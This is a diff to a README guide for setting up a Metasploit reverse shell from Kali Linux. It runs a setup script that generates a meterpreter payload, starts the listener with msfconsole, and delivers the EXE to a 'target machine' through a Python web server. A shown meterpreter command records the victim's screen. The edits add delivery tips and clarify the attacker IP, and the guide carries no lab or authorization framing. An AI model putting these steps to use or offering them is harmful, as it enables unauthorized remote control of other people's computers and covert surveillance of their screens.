@@ -4,14 +4,14 @@
 
 ## Quick Setup on Kali Linux
 
-### Step 1: Run the Automated Setup Script
+### Step 1: Run the Automated Setup Script here on my Github
 
 ```bash
 bash setup_reverse_shell.sh
 ```
 
 This will ask you for:
-- Your attacker IP (LHOST)
+- Your attacker IP (Just your Kali machines IP) (LHOST)
 - Listening port (default: 4444)
 - Target OS (Windows or Linux)
 
@@ -19,7 +19,7 @@ The script generates:
 - A meterpreter payload file (shell.exe or shell)
 - An RC file to start the listener
 
-### Step 2: Start the Listener
+### Step 2: Run this command to start the listner.
 
 ```bash
 msfconsole -r /tmp/handler_setup_*.rc
@@ -29,7 +29,7 @@ Or let the script do it automatically—it will start the listener in the backgr
 
 ### Step 3: Execute on Target
 
-On the target machine, run the generated payload:
+On the target machine, run the generated payload (You will have to find a way to put that generated EXE on the other computer, a simple way is to use python to host a quick web server and download it)
 
 **Windows:**
 ```powershell
@@ -58,5 +58,3 @@ meterpreter > record_desktop -d 10     # Record 10 seconds of their screen
 ```
 
 ---
-
-**Last Updated:** 2026-09-21
